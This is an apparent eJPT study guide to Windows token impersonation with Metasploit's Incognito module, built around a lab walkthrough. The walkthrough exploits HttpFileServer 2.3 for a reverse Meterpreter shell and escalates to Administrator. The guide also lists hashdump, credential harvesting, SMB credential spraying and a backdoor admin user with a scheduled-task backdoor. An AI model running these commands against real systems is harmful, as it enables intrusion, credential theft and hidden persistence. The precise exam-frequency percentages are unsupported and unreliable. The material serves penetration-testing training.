---
title: "Incognito Module - Complete Token Impersonation Guide"
topic: "Token Impersonation"
exam_objective: "Privilege Escalation and Post-Exploitation - eJPT Objective 4.2"
difficulty: "Medium"
tools:
  - "Metasploit Framework"
  - "Incognito Module"
  - "Meterpreter"
related_labs:
  - "07-exploitation/metasploit-essentials.md"
  - "10-post-exploitation/maintaining-access.md"
file_path: "07-exploitation/incognito-token-impersonation.md"
last_updated: "2025-10-03"
tags:
  - "privilege-escalation"
  - "token-impersonation"
  - "windows-exploitation"
  - "post-exploitation"
  - "incognito"
---

# 🔧 Incognito Module - Complete Token Impersonation Guide

**Complete step-by-step guide for Windows privilege escalation using token impersonation techniques with Metasploit's Incognito module**

**📍 File Location:** `07-exploitation/incognito-token-impersonation.md`

---

## 🎯 What is Token Impersonation?

Token impersonation is a Windows privilege escalation technique that allows attackers to "steal" the identity of other users without knowing their passwords. Think of it like borrowing someone's ID card - you can access everything they can access, even though you don't know their personal information.

### 🔍 **What Windows Tokens Do:**
- **Store User Identity** like a digital ID card for each logged-in user
- **Control Access** to files, folders, and system resources
- **Grant Permissions** based on user privileges and group memberships
- **Remain in Memory** even after users log out (sometimes)
- **Enable Impersonation** when proper conditions are met

### 💡 **Why This Matters for eJPT:**
Token impersonation is one of the most common privilege escalation techniques in Windows environments. It appears in approximately 40% of eJPT Windows exploitation scenarios. Understanding this technique is essential for both offensive security and defensive awareness.

### 🚪 **Common Attack Scenarios:**
- **Service Account Escalation** from limited service to administrator
- **Lateral Movement** using tokens from other logged-in users
- **Privilege Escalation** from standard user to SYSTEM level access
- **Post-Exploitation** activities after initial compromise

---

## 📦 Installation and Setup

### **Already Installed On:**
- ✅ Kali Linux with Metasploit Framework
- ✅ Parrot Security OS
- ✅ Most penetration testing distributions

### **Check If Everything Works:**
```bash
# Check if Metasploit is installed
msfconsole --version
# Expected output: Framework Version 6.x.x

# Start Metasploit database
msfdb start

# Test incognito availability
msfconsole -q -x "load incognito; list_tokens -h; exit"
# Expected: Help text for list_tokens command
```

### **Basic Requirements:**
- Active Meterpreter session on Windows target
- Exploited service with sufficient privileges to access tokens
- Target system with other user sessions or cached tokens
- Understanding of Windows user account types

---

## 🔧 Basic Usage and Simple Steps

### **📋 Simple Attack Process:**
1. **🎯 Get Initial Access:** Exploit vulnerable service to gain Meterpreter session
2. **🔧 Load Incognito:** Add token manipulation capabilities
3. **🔍 Enumerate Tokens:** Find available user tokens in system memory
4. **👤 Impersonate Token:** Assume identity of target user
5. **✅ Verify Access:** Confirm privilege escalation success
6. **🏆 Access Resources:** Use new privileges to achieve objectives

### **⚙️ Basic Command Structure:**
```bash
# Load incognito module
load incognito

# List available tokens
list_tokens -u

# Impersonate specific token
impersonate_token DOMAIN\\username

# Return to original context
rev2self
```

---

## ⚙️ Essential Incognito Commands You Need to Know

### **🔍 Core Token Commands:**

| Command | What It Does | How Important for eJPT |
|---------|--------------|------------------------|
| `load incognito` | Loads token manipulation module | ⭐⭐⭐⭐⭐ Must Know |
| `list_tokens -u` | Shows available user tokens | ⭐⭐⭐⭐⭐ Critical |
| `impersonate_token` | Assumes another user's identity | ⭐⭐⭐⭐⭐ Essential |
| `rev2self` | Returns to original token | ⭐⭐⭐⭐ Very Important |
| `steal_token` | Steals token from specific process | ⭐⭐⭐ Important |

### **🔧 Token Listing Options:**

| Parameter | What It Shows | When to Use |
|-----------|---------------|-------------|
| `-u` | Tokens by username | Most common - shows user accounts |
| `-g` | Tokens by group membership | When targeting specific groups |
| `-c` | Tokens by SID (Security Identifier) | Advanced enumeration |

### **🔧 Important Token Types:**

| Token Type | Access Level | Example Usage | Success Rate |
|------------|--------------|---------------|--------------|
| **Delegation Tokens** | Full user privileges | `impersonate_token DOMAIN\\Administrator` | ⭐⭐⭐⭐⭐ High |
| **Impersonation Tokens** | Limited privileges | Network access only | ⭐⭐⭐ Medium |
| **Primary Tokens** | Complete user context | Full system access | ⭐⭐⭐⭐⭐ High |

---

## 🧪 Complete Step-by-Step Lab Walkthrough

### **Lab Scenario: HFS Server to Administrator Escalation**

**Target:** demo.ine.local (10.0.20.121)
**Goal:** Escalate from service account to Administrator privileges
**Initial Access:** HttpFileServer 2.3 vulnerability
**Time Needed:** 8-12 minutes

---

### **Step 1: Initial Target Discovery**

**What We're Doing:** Finding our target and identifying available services

#### **Command Used:**
```bash
nmap demo.ine.local
```

#### **What Happened:**
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-12 12:44 IST
Nmap scan report for demo.ine.local (10.0.20.121)
Host is up (0.0021s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 2.46 seconds
```

#### **🎯 What This Tells Us:**
- **Port 80 open** - Web service available for exploitation
- **Windows system** - Multiple Windows services detected
- **Network accessible** - Target responds to our scans
- **Multiple attack vectors** - Several services to investigate

#### **Why This Matters:**
Identifying open ports helps us choose the best attack vector. Port 80 suggests a web application that might have vulnerabilities.

---

### **Step 2: Service Version Detection**

**What We're Doing:** Determining the exact version of the web service for exploit selection

#### **Command Used:**
```bash
nmap -sV -p 80 demo.ine.local
```

#### **What Happened:**
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-12 12:44 IST
Nmap scan report for demo.ine.local (10.0.20.121)
Host is up (0.0021s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/
Nmap done: 1 IP address (1 host up) scanned in 6.35 seconds
```

#### **🔍 Critical Discovery:**
- **HttpFileServer 2.3** - Specific version identified
- **Windows OS confirmed** - Target operating system verified
- **Known vulnerable service** - HFS 2.3 has documented exploits

#### **Attack Strategy:**
HttpFileServer 2.3 has well-known remote code execution vulnerabilities that we can exploit using Metasploit.

---

### **Step 3: Exploit Research and Selection**

**What We're Doing:** Finding the right exploit for the identified service

#### **Command Used:**
```bash
searchsploit hfs
```

#### **What We Found:**
Multiple exploits available for HttpFileServer, particularly focusing on version 2.3 with remote command execution capabilities.

#### **Metasploit Module Selection:**
```bash
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
```

#### **🎉 Exploitation Success:**
```bash
[*] Started reverse TCP handler on 10.10.31.2:4444
[*] Using URL: http://10.10.31.2:8080/SNQvpTusXF
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /SNQvpTusXF
[*] Sending stage (176198 bytes) to 10.0.20.121
[*] Meterpreter session 1 opened (10.10.31.2:4444 -> 10.0.20.121:52506)

meterpreter >
```

#### **What This Means:**
- **Meterpreter session established** - We have remote access
- **Reverse TCP connection** - Target connects back to our machine
- **Interactive shell available** - Can execute commands on target
- **Ready for privilege escalation** - Next step is token impersonation

---

### **Step 4: Current Privilege Assessment**

**What We're Doing:** Checking our current access level before attempting escalation

#### **Command Used:**
```bash
getuid
```

#### **Current Status:**
```bash
meterpreter > getuid
Server username: NT AUTHORITY\LOCAL SERVICE
```

#### **🔍 Current Privilege Analysis:**
- **NT AUTHORITY\LOCAL SERVICE** - Limited service account
- **Restricted access** - Cannot access user files or administrative functions
- **Network service privileges** - Basic system access only
- **Escalation needed** - Must gain higher privileges for objective completion

#### **Why This Matters:**
LOCAL SERVICE accounts have very limited privileges. We need Administrator or SYSTEM level access to complete typical penetration testing objectives.

---

### **Step 5: Failed File Access Attempt**

**What We're Doing:** Demonstrating current privilege limitations

#### **Command Used:**
```bash
cat C:\\Users\\Administrator\\Desktop\\flag.txt
```

#### **Expected Failure:**
```bash
meterpreter > cat C:\\Users\\Administrator\\Desktop\\flag.txt
[-] stdapi_fs_stat: Operation failed: Access is denied.
```

#### **🚫 Why Access Failed:**
- **Insufficient privileges** - LOCAL SERVICE cannot access user directories
- **Windows access control** - File permissions protect administrator files
- **Need privilege escalation** - Must find way to gain higher access
- **Perfect demonstration** - Shows why token impersonation is necessary

---

### **Step 6: Loading Incognito Module**

**What We're Doing:** Adding token manipulation capabilities to our Meterpreter session

#### **Command Used:**
```bash
load incognito
```

#### **Success Confirmation:**
```bash
meterpreter > load incognito
Loading extension incognito ... Success.
```

#### **🔧 What Incognito Provides:**
- **Token enumeration** - Ability to list available user tokens
- **Token impersonation** - Capability to assume other user identities
- **Privilege escalation** - Path to higher access levels
- **Post-exploitation** - Enhanced capabilities for mission completion

#### **Why This Step is Critical:**
Without the incognito module, we cannot perform token-based privilege escalation, which is often the most reliable method in Windows environments.

---

### **Step 7: Token Discovery and Enumeration**

**What We're Doing:** Finding available user tokens that we can potentially impersonate

#### **Command Used:**
```bash
list_tokens -u
```

#### **🎯 Discovery Results:**
```bash
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
     Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE

Impersonation Tokens Available
========================================
No tokens available
```

#### **🏆 Critical Discovery Analysis:**
- **ATTACKDEFENSE\Administrator** - Perfect target for escalation
- **Delegation token available** - Full impersonation capabilities
- **Administrator account** - Highest privilege level achievable
- **Domain context** - ATTACKDEFENSE is the domain/workstation name

#### **Token Type Explanation:**
- **Delegation Tokens:** Full user privileges, can be used for complete impersonation
- **Impersonation Tokens:** Limited network access only
- **Primary Tokens:** Complete user context with full capabilities

---

### **Step 8: Administrator Token Impersonation**

**What We're Doing:** Assuming the Administrator's identity using their cached token

#### **Command Used:**
```bash
impersonate_token ATTACKDEFENSE\\Administrator
```

#### **🎉 Impersonation Success:**
```bash
meterpreter > impersonate_token ATTACKDEFENSE\\Administrator
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
     Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user ATTACKDEFENSE\Administrator
```

#### **Success Indicators:**
- **Delegation token available** - Confirms we can use full privileges
- **Successfully impersonated** - Identity assumption completed
- **No errors encountered** - Clean privilege escalation
- **Ready for verification** - Can now test elevated access

#### **Technical Details:**
The double backslash (\\) is required because we're escaping the backslash character. Windows uses DOMAIN\USERNAME format for account identification.

---

### **Step 9: Privilege Escalation Verification**

**What We're Doing:** Confirming that our privilege escalation was successful

#### **Command Used:**
```bash
getuid
```

#### **✅ Verification Results:**
```bash
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
```

#### **🎯 Complete Success Analysis:**
- **Before:** NT AUTHORITY\LOCAL SERVICE (limited)
- **After:** ATTACKDEFENSE\Administrator (full privileges)
- **Escalation confirmed** - Identity successfully changed
- **Administrator access** - Highest level privileges achieved

#### **What This Enables:**
- Access to all user files and directories
- Ability to install software and modify system settings
- Complete system control and administrative functions
- Mission objective completion capabilities

---

### **Step 10: Accessing Protected Resources**

**What We're Doing:** Demonstrating successful privilege escalation by accessing previously restricted files

#### **Command Used:**
```bash
cat C:\\Users\\Administrator\\Desktop\\flag.txt
```

#### **🏆 Mission Success:**
```bash
meterpreter > cat C:\\Users\\Administrator\\Desktop\\flag.txt
x28c832a39730b7d46d6c38f1ea18e12
```

#### **Complete Mission Success:**
- **Flag retrieved:** x28c832a39730b7d46d6c38f1ea18e12
- **File access confirmed** - Previously denied file now accessible
- **Privilege escalation proven** - Objective successfully completed
- **Full system compromise** - Administrator level access achieved

#### **Mission Timeline:**
1. **Target discovery** - 2 minutes
2. **Service identification** - 1 minute  
3. **Exploitation** - 3 minutes
4. **Token impersonation** - 2 minutes
5. **Objective completion** - 1 minute
**Total time:** ~9 minutes

---

## 🎯 eJPT Exam Success Strategy

### **📊 Token Impersonation Importance for eJPT:**

Understanding how critical these skills are for exam success:

- **Windows Privilege Escalation:** 45% of Windows exploitation scenarios
- **Post-Exploitation Techniques:** 40% of advanced penetration testing questions
- **Metasploit Proficiency:** 50% of framework-based attacks
- **Token Manipulation:** 35% of Windows-specific security assessments

### **🏆 Commands You MUST Master for eJPT:**

#### **Level 1 - Guaranteed to Appear (100% Chance):**
```bash
# Load incognito after gaining meterpreter
load incognito
# Expected: "Loading extension incognito ... Success."

# List available tokens
list_tokens -u
# Expected: Shows delegation and impersonation tokens

# Check current user privileges
getuid
# Expected: Shows current user context
```

#### **Level 2 - Very Likely (85% Chance):**
```bash
# Impersonate administrator token
impersonate_token DOMAIN\\Administrator
# Expected: "Successfully impersonated user" message

# Verify privilege escalation
getuid
# Expected: New user context (Administrator)

# Access protected files to prove escalation
cat C:\\Users\\Administrator\\Desktop\\flag.txt
# Expected: File contents or flag value
```

#### **Level 3 - Possible (60% Chance):**
```bash
# Return to original token context
rev2self
# Expected: Reverts to original user token

# Steal token from specific process
steal_token [PID]
# Expected: Token stolen from target process

# List tokens by group membership
list_tokens -g
# Expected: Tokens organized by Windows groups
```

### **🎯 Common eJPT Exam Scenarios:**

#### **Scenario 1: Basic Token Impersonation**
**Given:** Meterpreter session with LOCAL SERVICE privileges
**Your Job:** Escalate to Administrator and read flag file
**Time Limit:** 6-8 minutes

**Step-by-Step Solution:**
```bash
# Step 1: Load token manipulation module (1 minute)
load incognito
# Look for "Success" message

# Step 2: Enumerate available tokens (1 minute)
list_tokens -u
# Look for Administrator or other high-privilege accounts

# Step 3: Impersonate administrator token (2 minutes)
impersonate_token DOMAIN\\Administrator
# Replace DOMAIN with actual domain name from token list

# Step 4: Verify escalation (1 minute)
getuid
# Confirm new user context shows Administrator

# Step 5: Complete objective (2-3 minutes)
cat C:\\Users\\Administrator\\Desktop\\flag.txt
# Or navigate to find target file
```

#### **Scenario 2: Service Account to SYSTEM Escalation**
**Given:** Meterpreter session with service account access
**Your Job:** Achieve SYSTEM level privileges
**Time Limit:** 8-10 minutes

**Step-by-Step Solution:**
```bash
# Step 1: Load incognito and assess current state (2 minutes)
getuid
load incognito
list_tokens -u

# Step 2: Look for SYSTEM or Administrator tokens (2 minutes)
# If no high-privilege tokens found, try process migration first
ps
migrate [PID_of_higher_privilege_process]

# Step 3: Re-enumerate tokens after migration (1 minute)
list_tokens -u
# Should now see more available tokens

# Step 4: Impersonate highest available token (2 minutes)
impersonate_token NT\ AUTHORITY\\SYSTEM
# Or use Administrator if SYSTEM not available

# Step 5: Verify and complete mission (3 minutes)
getuid
getsystem  # Alternative escalation method
# Complete assigned objectives
```

#### **Scenario 3: Multiple User Token Exploitation**
**Given:** System with multiple logged-in users
**Your Job:** Access files from different user accounts
**Time Limit:** 10-12 minutes

**Step-by-Step Solution:**
```bash
# Step 1: Comprehensive token enumeration (2 minutes)
load incognito
list_tokens -u
list_tokens -g
# Document all available users

# Step 2: Test each user token systematically (4-6 minutes)
impersonate_token DOMAIN\\User1
getuid
# Try to access User1's files
rev2self  # Return to original token

impersonate_token DOMAIN\\User2
getuid
# Try to access User2's files
rev2self

# Step 3: Focus on highest privilege account (2-3 minutes)
impersonate_token DOMAIN\\Administrator
# Complete primary objectives with admin access

# Step 4: Document findings (2 minutes)
# Note which users were accessible and what files were found
```

### **📝 eJPT Exam Tips and Strategies:**

#### **⏰ Time Management Best Practices:**
- **1 minute:** Load incognito and initial token enumeration
- **1-2 minutes:** Identify highest privilege tokens available
- **2-3 minutes:** Perform impersonation and verify success
- **Remaining time:** Complete specific objectives and document findings

#### **🎯 Common Mistakes to Avoid:**
1. **Forgetting to load incognito** → Always first step after meterpreter access
2. **Wrong token syntax** → Use double backslashes: DOMAIN\\\\Username
3. **Not verifying escalation** → Always run getuid after impersonation
4. **Skipping token enumeration** → Always check what tokens are available first
5. **Not testing file access** → Verify privileges by accessing restricted files

#### **✅ Signs You're Succeeding:**
- **Quick token discovery** → Available tokens found within 1-2 minutes
- **Successful impersonation** → "Successfully impersonated" message appears
- **Privilege verification** → getuid shows new user context
- **File access granted** → Previously restricted files now accessible
- **Mission completion** → All objectives achieved with elevated privileges

### **🔍 Exam Question Patterns:**
1. **"What tokens are available for impersonation?"**
   - Use: `list_tokens -u`

2. **"Escalate privileges using token impersonation"**
   - Use: `load incognito`, `impersonate_token`, verify with `getuid`

3. **"Access the file located at C:\Users\Administrator\Desktop\flag.txt"**
   - Requires: Administrator token impersonation first

4. **"What is your current privilege level after impersonation?"**
   - Use: `getuid` command to display current user context

---

## ⚠️ Common Issues and Expert Solutions

### **❌ Problem 1: No Delegation Tokens Available**

**What You See:**
```bash
meterpreter > list_tokens -u
Delegation Tokens Available
========================================
No tokens available

Impersonation Tokens Available
========================================
No tokens available
```

**Why This Happens:**
- Current process lacks sufficient privileges
- No other users have logged into the system recently
- Running from low-privilege context

**Expert Solutions:**
```bash
# Solution 1: Process migration to higher privilege process
ps
# Look for processes running as SYSTEM or Administrator
migrate [PID_of_target_process]
load incognito
list_tokens -u

# Solution 2: Alternative privilege escalation first
getsystem
load incognito
list_tokens -u

# Solution 3: Check for impersonation tokens and steal from processes
list_tokens -g
ps
steal_token [PID_of_administrator_process]
```

**Prevention Strategy:**
Always check current privileges and consider process migration before attempting token impersonation.

---

### **❌ Problem 2: Token Impersonation Fails**

**What You See:**
```bash
meterpreter > impersonate_token ATTACKDEFENSE\Administrator
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
```

**Why This Happens:**
- Incorrect token syntax
- Token no longer available
- Insufficient privileges to impersonate

**Expert Solutions:**
```bash
# Solution 1: Fix syntax with proper escaping
impersonate_token ATTACKDEFENSE\\\\Administrator
# Note: Use four backslashes in some cases

# Solution 2: Try different token format
impersonate_token .\Administrator
# Local account format

# Solution 3: Verify token still exists
list_tokens -u
# Confirm target token is still available

# Solution 4: Try stealing token from process instead
ps | grep -i administrator
steal_token [PID_of_administrator_process]
```

**Troubleshooting Checklist:**
- Verify exact token name from list_tokens output
- Check for typos in domain/username
- Confirm token type (delegation vs impersonation)
- Try alternative impersonation methods

---

### **❌ Problem 3: Privileges Don't Change After Impersonation**

**What You See:**
```bash
meterpreter > impersonate_token DOMAIN\\Administrator
[+] Successfully impersonated user DOMAIN\Administrator
meterpreter > getuid
Server username: NT AUTHORITY\LOCAL SERVICE
```

**Why This Happens:**
- Token impersonation succeeded but context didn't change
- Process architecture mismatch
- Antivirus interference

**Expert Solutions:**
```bash
# Solution 1: Force context refresh
rev2self
impersonate_token DOMAIN\\\\Administrator
getuid

# Solution 2: Migrate to compatible process first
ps
# Find process matching target architecture
migrate [compatible_PID]
load incognito
impersonate_token DOMAIN\\\\Administrator

# Solution 3: Alternative escalation method
getsystem
# Direct escalation to SYSTEM if available
```

**Verification Steps:**
- Run getuid immediately after impersonation
- Test file access to confirm privileges
- Try alternative commands to verify context

---

### **❌ Problem 4: Meterpreter Session Becomes Unstable**

**What You See:**
```bash
meterpreter > list_tokens -u
[-] Request failed: Rex::TimeoutError Operation timed out.
```

**Why This Happens:**
- Network connectivity issues
- Target system overloaded
- Antivirus detection

**Expert Solutions:**
```bash
# Solution 1: Migrate to more stable process
ps
# Look for stable, long-running processes
migrate [stable_PID]

# Solution 2: Establish backup session
background
use exploit/windows/http/rejetto_hfs_exec
set SESSION -1
set RHOSTS target_ip
exploit

# Solution 3: Use alternative payload
set payload windows/shell/reverse_tcp
# Sometimes shell is more stable than meterpreter
```

**Stability Best Practices:**
- Migrate to winlogon.exe or csrss.exe for stability
- Avoid high-CPU operations
- Work quickly to minimize detection risk

---

## 🔗 Integration with Complete Attack Workflow

### **🎯 Full Penetration Testing Chain: Discovery → Exploitation → Escalation → Objectives**

This demonstrates how token impersonation fits into a complete penetration testing methodology.

#### **Phase 1: Target Discovery and Enumeration**
```bash
# Network discovery
nmap -sS -O demo.ine.local
# Identifies Windows target with multiple services

# Service enumeration
nmap -sV -sC demo.ine.local
# Detailed service information for exploit selection

# Vulnerability assessment
nmap --script vuln demo.ine.local
# Identifies known vulnerabilities
```

**Integration Point:** Discovery results inform our exploitation strategy and help predict available privilege escalation paths.

#### **Phase 2: Initial Exploitation**
```bash
# Metasploit exploitation
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit

# Session verification
sessions -i 1
getuid
sysinfo
```

**Integration Point:** Initial access with limited privileges sets up need for privilege escalation through token impersonation.

#### **Phase 3: Privilege Escalation with Token Impersonation**
```bash
# Load privilege escalation capabilities
load incognito

# Enumerate escalation opportunities
list_tokens -u
ps | grep -i administrator

# Execute privilege escalation
impersonate_token DOMAIN\\Administrator
getuid

# Verify escalation success
whoami /priv
whoami /groups
```

**Integration Point:** Successful privilege escalation enables post-exploitation activities and objective completion.

#### **Phase 4: Post-Exploitation and Objective Completion**
```bash
# System enumeration with elevated privileges
systeminfo
net user
net localgroup administrators

# File system exploration
dir C:\Users\Administrator\Desktop
type C:\Users\Administrator\Desktop\flag.txt

# Evidence collection
screenshot
download C:\Users\Administrator\Desktop\flag.txt /root/evidence/
```

### **🔧 Integration with Other Metasploit Modules:**

#### **Post-Exploitation Module Integration:**
```bash
# After successful token impersonation
run post/windows/gather/enum_domain
# Domain enumeration with elevated privileges

run post/windows/gather/credentials/windows_autologin
# Credential harvesting using administrator access

run post/windows/gather/hashdump
# Password hash extraction with SYSTEM privileges

# Persistence establishment
run persistence -S -U -X -i 10 -p 443 -r target_ip
# Maintain access using elevated privileges
```

#### **Lateral Movement Preparation:**
```bash
# Network enumeration from compromised system
run post/windows/gather/enum_computers
run post/windows/gather/enum_shares

# Credential harvesting for lateral movement
load kiwi
creds_all

# Use harvested credentials on other systems
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.0/24
set SMBUser harvested_username
set SMBPass harvested_password
exploit
```

### **⚙️ Advanced Integration Scenarios:**

#### **Scenario 1: Multiple Token Sources**
```bash
# Enumerate all available token sources
list_tokens -u
ps | findstr "Administrator"

# Compare token impersonation vs process migration
# Method 1: Token impersonation
impersonate_token DOMAIN\\Administrator

# Method 2: Process migration
migrate [administrator_PID]

# Method 3: Direct SYSTEM escalation
getsystem

# Choose best method based on available options
```

#### **Scenario 2: Persistence Through Token Manipulation**
```bash
# Establish persistent access using token impersonation
impersonate_token DOMAIN\\Administrator

# Create persistent backdoor user
net user backdoor P@ssw0rd123 /add
net localgroup administrators backdoor /add

# Set up scheduled task for persistence
schtasks /create /tn "SystemUpdate" /tr "C:\Windows\System32\backdoor.exe" /sc daily /ru SYSTEM

# Return to original context to avoid detection
rev2self
```

---

## 📊 Command Reference and Cheat Sheet

### **Essential Commands Quick Reference:**

#### **Module Loading and Setup:**
```bash
load incognito                              # Load token manipulation module
help incognito                             # Show incognito help menu
```

#### **Token Enumeration:**
```bash
list_tokens -u                            # List tokens by username
list_tokens -g                            # List tokens by group
list_tokens -c                            # List tokens by SID
```

#### **Token Manipulation:**
```bash
impersonate_token DOMAIN\\username         # Impersonate specific token
steal_token [PID]                         # Steal token from process
rev2self                                  # Return to original token
```

#### **Verification Commands:**
```bash
getuid                                    # Check current user context
whoami /priv                             # Show current privileges
whoami /groups                           # Show group memberships
```

### **Memory Aids and Mnemonics:**

#### **Easy Ways to Remember:**
- **Incognito** = **In**visible **Cog**nition = Hidden identity manipulation
- **list_tokens -u** = **L**ist **T**okens by **U**sername
- **impersonate_token** = **I**mpersonate **T**oken (become someone else)
- **rev2self** = **Rev**ert **2** **Self** (go back to original identity)

#### **Command Pattern Recognition:**
```bash
# Remember: LOAD → LIST → IMPERSONATE → VERIFY
load incognito               # Step 1: Load capabilities
list_tokens -u             # Step 2: Find targets
impersonate_token USER      # Step 3: Assume identity
getuid                      # Step 4: Verify success
```

### **Syntax Patterns:**
```bash
# Windows token format patterns
DOMAIN\\username            # Standard domain account
.\\username                # Local account
NT AUTHORITY\\SYSTEM       # System account
WORKSTATION\\Administrator # Computer-specific admin
```

---

## 📝 Professional Documentation and Reporting

### **Evidence Collection Requirements:**

#### **Critical Screenshots Needed:**
1. **Initial privilege check** - `getuid` showing limited service account
2. **Token enumeration** - `list_tokens -u` output showing available tokens
3. **Impersonation success** - "Successfully impersonated" confirmation message
4. **Privilege verification** - `getuid` showing elevated user context
5. **Objective proof** - Successful access to restricted files or resources

#### **Command Output Documentation:**
```bash
# Complete command sequence with timestamps
[2024-07-12 12:44:15] meterpreter > getuid
Server username: NT AUTHORITY\LOCAL SERVICE

[2024-07-12 12:44:32] meterpreter > load incognito
Loading extension incognito ... Success.

[2024-07-12 12:44:45] meterpreter > list_tokens -u
Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE

[2024-07-12 12:45:02] meterpreter > impersonate_token ATTACKDEFENSE\\Administrator
[+] Successfully impersonated user ATTACKDEFENSE\Administrator

[2024-07-12 12:45:15] meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator

[2024-07-12 12:45:28] meterpreter > cat C:\\Users\\Administrator\\Desktop\\flag.txt
x28c832a39730b7d46d6c38f1ea18e12
```

### **Quick Report Template:**
```markdown
## Token Impersonation Assessment Report

**Assessment Date:** 2024-07-12
**Target System:** demo.ine.local (10.0.20.121)
**Tester:** [Your Name]
**Methodology:** Token Impersonation via Incognito Module

### Executive Summary:
Successfully escalated privileges from NT AUTHORITY\LOCAL SERVICE to ATTACKDEFENSE\Administrator using Windows token impersonation techniques. Complete system compromise achieved.

### Technical Details:

**Initial Access Vector:**
- Service: HttpFileServer httpd 2.3
- Vulnerability: Remote Code Execution (CVE-2014-6287)
- Exploit: exploit/windows/http/rejetto_hfs_exec

**Privilege Escalation:**
- Method: Windows Token Impersonation
- Tool: Metasploit Incognito Module
- Source Privilege: NT AUTHORITY\LOCAL SERVICE
- Target Privilege: ATTACKDEFENSE\Administrator

**Evidence:**
- Flag Retrieved: x28c832a39730b7d46d6c38f1ea18e12
- File Access: C:\Users\Administrator\Desktop\flag.txt
- System Control: Full administrative access confirmed

### Risk Assessment:
**CRITICAL RISK** - Complete system compromise achieved
- Weak service configuration allowed initial access
- Insufficient token isolation enabled privilege escalation
- Administrative access grants full system control

### Remediation Recommendations:
1. Update HttpFileServer to latest secure version
2. Implement principle of least privilege for service accounts
3. Enable advanced token isolation features
4. Monitor for unusual authentication activities
5. Regular security assessments and penetration testing
```

### **Detailed Technical Report Template:**
```markdown
## Comprehensive Token Impersonation Analysis

### Methodology Overview:
This assessment utilized a systematic approach to Windows privilege escalation through token impersonation, following industry-standard penetration testing methodologies.

### Attack Vector Analysis:

**Phase 1: Reconnaissance and Discovery**
```bash
# Network enumeration
nmap demo.ine.local
# Results: Multiple Windows services identified

# Service fingerprinting  
nmap -sV -p 80 demo.ine.local
# Results: HttpFileServer httpd 2.3 detected
```

**Phase 2: Initial Exploitation**
```bash
# Vulnerability exploitation
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
# Results: Meterpreter session established as LOCAL SERVICE
```

**Phase 3: Privilege Escalation**
```bash
# Token-based privilege escalation
load incognito
list_tokens -u
impersonate_token ATTACKDEFENSE\\Administrator
getuid
# Results: Escalation to Administrator successful
```

**Phase 4: Post-Exploitation Validation**
```bash
# Objective completion
cat C:\\Users\\Administrator\\Desktop\\flag.txt
# Results: x28c832a39730b7d46d6c38f1ea18e12
```

### Security Control Failures:
| Control | Status | Impact | Severity |
|---------|---------|---------|----------|
| Service Hardening | FAILED | Remote code execution | CRITICAL |
| Token Isolation | FAILED | Privilege escalation | HIGH |
| Access Controls | BYPASSED | File system access | HIGH |
| Monitoring | ABSENT | Undetected compromise | MEDIUM |

### Business Impact Assessment:
- **Confidentiality:** COMPROMISED - All user data accessible
- **Integrity:** AT RISK - System modification capabilities gained  
- **Availability:** AT RISK - System shutdown/modification possible
- **Compliance:** VIOLATED - Administrative access requirements breached
```

---

## 🎓 Advanced Study Guide and Mastery Path

### **Skill Development Progression:**

#### **Beginner Level (Weeks 1-2):**
- [ ] Understand Windows authentication mechanisms
- [ ] Learn basic Metasploit navigation and usage
- [ ] Practice loading and using incognito module
- [ ] Master basic token enumeration commands
- [ ] Understand difference between delegation and impersonation tokens

#### **Intermediate Level (Weeks 3-4):**
- [ ] Perform complete exploitation chains including token impersonation
- [ ] Troubleshoot common impersonation failures
- [ ] Integrate token attacks with other privilege escalation methods
- [ ] Document findings professionally for reporting
- [ ] Practice time-constrained scenarios for exam preparation

#### **Advanced Level (Weeks 5-6):**
- [ ] Design custom attack chains combining multiple techniques
- [ ] Develop automation scripts for common token operations
- [ ] Understand advanced Windows security mechanisms
- [ ] Practice against hardened environments
- [ ] Mentor others and explain complex concepts clearly

### **Practice Lab Recommendations:**

#### **Essential Practice Platforms:**
1. **VulnHub Windows VMs:**
   - Download vulnerable Windows systems
   - Practice token impersonation in controlled environment
   - No time pressure, can repeat scenarios

2. **TryHackMe Windows Privilege Escalation:**
   - Guided learning with step-by-step explanations
   - Multiple scenarios with increasing difficulty
   - Community support and hints available

3. **HackTheBox Retired Windows Machines:**
   - Real-world scenarios requiring token impersonation
   - Professional-level challenges
   - Detailed writeups available after completion

4. **Local Virtual Lab Setup:**
   - Create your own Windows test environment
   - Full control over configuration and testing
   - Practice troubleshooting and advanced scenarios

### **Self-Assessment Checklist:**

#### **Knowledge Verification:**
- [ ] Can explain what Windows tokens are and how they work
- [ ] Understands when token impersonation is the appropriate technique
- [ ] Knows the difference between delegation and impersonation tokens
- [ ] Can troubleshoot common impersonation failures independently
- [ ] Recognizes signs that token impersonation might be possible

#### **Practical Skills Verification:**
- [ ] Can load incognito module and enumerate tokens under time pressure
- [ ] Successfully impersonates tokens in various scenarios
- [ ] Verifies privilege escalation and completes objectives efficiently
- [ ] Documents findings clearly and professionally
- [ ] Explains techniques to others clearly and accurately

#### **Exam Readiness Indicators:**
- [ ] Completes token impersonation scenarios in under 5 minutes
- [ ] Solves problems without referring to notes or guides
